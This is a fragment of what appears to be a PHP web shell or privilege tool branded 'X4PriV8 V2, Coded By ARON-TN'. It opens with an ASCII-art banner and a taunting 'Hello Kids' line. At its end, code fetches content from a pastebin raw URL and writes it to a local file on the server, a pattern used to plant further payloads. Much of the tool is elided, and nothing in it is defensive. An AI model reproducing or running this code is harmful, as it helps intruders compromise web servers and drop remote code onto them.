...
ARON-TN Say ="Hello Kids ... :D"
 

 _______  ______    _______  __    _         _______  __    _ 
|   _   ||    _ |  |       ||  |  | |       |       ||  |  | |
|  |_|  ||   | ||  |   _   ||   |_| | ____  |_     _||   |_| |
|       ||   |_||_ |  | |  ||       ||____|   |   |  |       |
|       ||    __  ||  |_|  ||  _    |         |   |  |  _    |
|   _   ||   |  | ||       || | |   |         |   |  | | |   |
|__| |__||___|  |_||_______||_|  |__|         |___|  |_|  |__|
...
echo '<br />X4PriV8 <font color="red">V2</font>, Coded By <font color="red">ARON-TN</font>
</BODY>
</HTML>';
function perms($file){
...
$text3 = http_get('https://pastebin.com/raw/FJkAgMZ3');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
?>